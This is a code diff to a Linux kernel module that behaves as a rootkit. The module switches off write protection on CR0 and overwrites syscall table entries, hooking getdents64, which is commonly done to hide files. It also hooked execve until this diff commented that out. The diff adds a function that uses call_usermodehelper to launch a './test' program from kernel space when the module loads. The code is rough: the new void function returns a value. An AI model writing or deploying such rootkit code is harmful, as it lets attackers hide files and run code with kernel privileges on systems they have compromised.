@@ -35,6 +35,16 @@ asmlinkage long hooked_execve(const char __user *filename,
 #define DISABLE_WRITE_PROTECTION (write_cr0(read_cr0() & (~ 0x10000)))
 #define ENABLE_WRITE_PROTECTION (write_cr0(read_cr0() | 0x10000))
 asmlinkage unsigned long **syscall_table;
+
+static void test(){
+    char *argv[] = { "./test", NULL};
+    static char *envp[] = {
+            "HOME=/",
+            "TERM=linux",
+            "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+}
  
 static int lkm_init(void)
 {
@@ -43,10 +53,11 @@ static int lkm_init(void)
     
     DISABLE_WRITE_PROTECTION;
     kl_getdents64 = (void *)syscall_table[__NR_getdents64];
-    kl_execve = (void *)syscall_table[__NR_execve]; 
+//    kl_execve = (void *)syscall_table[__NR_execve]; 
     syscall_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;
 //    kernel_execve("./test", )
-    syscall_table[__NR_execve] = (unsigned long *)hooked_execve;
+//    syscall_table[__NR_execve] = (unsigned long *)hooked_execve;
+    test();
     ENABLE_WRITE_PROTECTION;
     
     return 0;    
